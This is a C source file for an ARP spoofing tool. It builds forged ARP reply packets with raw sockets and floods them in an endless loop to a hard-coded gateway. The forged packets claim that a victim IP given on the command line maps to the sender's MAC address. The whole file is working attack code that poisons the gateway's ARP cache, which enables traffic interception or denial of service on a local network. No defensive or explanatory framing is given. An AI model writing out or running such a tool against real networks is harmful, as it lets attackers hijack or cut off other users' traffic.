#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#include<time.h>
#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<string.h>
#include<sys/select.h>
#include<pthread.h>
#include<signal.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/shm.h>
#include<unistd.h>
#include<sys/un.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<errno.h>
#include<netinet/if_ether.h>
#include<net/ethernet.h>
#include<netinet/ether.h>
#include<netinet/udp.h>
#include<sys/ipc.h>
#include<sys/msg.h>

struct arphdr
{
        uint16_t htype;		//Hardware type
        uint16_t ptype;		//Protocol type
        uint8_t hlen;		//Hardware address length
        uint8_t plen;		//Protocol address length
  	uint16_t opcode;	//Operation code
        uint8_t sender_mac[6];  
        uint8_t sender_ip[4];
        uint8_t target_mac[6];
	uint8_t target_ip[4]; 

/*
    #define    ARPOP_REQUEST	1	// request to resolve address 
    #define    ARPOP_REPLY	2	// response to previous request 
    #define    ARPOP_REVREQUEST 3	// request protocol address given hardware
    #define    ARPOP_REVREPLY	4	// response giving protocol address 
    #define    ARPOP_INVREQUEST 8 	// request to identify peer 
    #define    ARPOP_INVREPLY	9	// response identifying peer 
*/

};

int main(int argc, const char* argv[])
{


	int sfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	char  interface[40];
	strcpy (interface, argv[5]);
	if(sfd==-1)
	{
		perror("socket");
	}
	char* buf = (char*)malloc(1500);
	uint8_t src[6],dst[6];

	//usr mac address
	src[0] = 0x8C;
	src[1] = 0x16;
	src[2] = 0x45;
	src[3] = 0xCE;
	src[4] = 0x8B;
	src[5] = 0xE4;

	//local gateway mac address
	dst[0] = 0x00;
	dst[1] = 0x25;
	dst[2] = 0x83;
	dst[3] = 0x70;
	dst[4] = 0x10;
	dst[5] = 0x00;
	
	memcpy(buf,dst,6*(sizeof (uint8_t)));
	memcpy(buf+6*(sizeof (uint8_t)),src,6*(sizeof (uint8_t)));
	
	buf[12] = ETH_P_ARP / 256;
	buf[13] = ETH_P_ARP % 256;
	
	struct arphdr* arp = (struct arphdr*)(buf+14);
	arp->htype = htons(1);		//because we use ethernet
	arp->ptype = 8;	// ETH_P_IP = 0x0800 
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(2);		// ARP reply
	
	memcpy(arp->sender_mac ,src,6*(sizeof(uint8_t)));
	memcpy(arp->target_mac ,dst,6*(sizeof(uint8_t)));
	
	// Friend's IP
	arp->sender_ip[0] = atoi(argv[1]);
	arp->sender_ip[1] = atoi(argv[2]);
	arp->sender_ip[2] = atoi(argv[3]);
	arp->sender_ip[3] = atoi(argv[4]);
	
	//Gateway IP
	arp->target_ip[0] = 172;
	arp->target_ip[1] = 30;
	arp->target_ip[2] = 100;
	arp->target_ip[3] = 1;
	
	memcpy(buf+14,arp,28);
	
	int bytes;
		
        struct sockaddr_ll device;
        memset (&device, 0, sizeof (device));
	if ((device.sll_ifindex = if_nametoindex (interface)) == 0)
	{
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}
	printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
        device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, dst, 6 * sizeof (uint8_t));
	device.sll_halen = 6;
				    
	while(1)	
        {
  	      if ((bytes = sendto (sfd, buf,42, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) 
	      {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
	      }
        }
        
}
